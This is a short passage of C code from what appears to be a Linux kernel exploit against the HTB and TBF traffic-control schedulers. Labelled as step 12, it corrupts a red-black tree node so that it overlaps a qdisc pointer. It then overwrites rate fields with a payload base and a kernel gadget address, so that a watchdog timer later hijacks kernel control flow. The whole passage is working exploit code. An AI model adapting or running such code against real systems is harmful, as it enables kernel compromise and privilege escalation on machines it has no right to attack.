    // Notice how Q's rb_left child is now F
    // offsetof(struct rb_node, rb_left) = 0x10
    // And since we placed Q 0x10 bytes before the &htb->leaf.q (qdisc) pointer
    // F overlaps with this pointer

    // @step(12): Replace htb->rate.rate_bytes_ps with CEA base, ceil64 with COP gadget
    // Now we only need to wait for the TBF watchdog timer to fire
    // to hijack control flow
    htb_custom_opt.rate64 = CEA_OFFSET(ceabase);
    htb_custom_opt.ceil64 = kbase + COP_GADGET_1;
    for (int i = 3; i < NUM_HTB_CLASSES; i++)
        tc(ADD_CLASS, "htb",  "dummy-1", TC_H(1, i), TC_H(1, 0), &htb_custom_opt, 1);

    //
    //                Q
    //               /  \
    //              F    ...
    //               \
    //                COP_GADGET_1 (Fake htb->leaf.q->dequeue())
    //

    // Store the CEA payload an crash the program
    cea_store_payload();
}
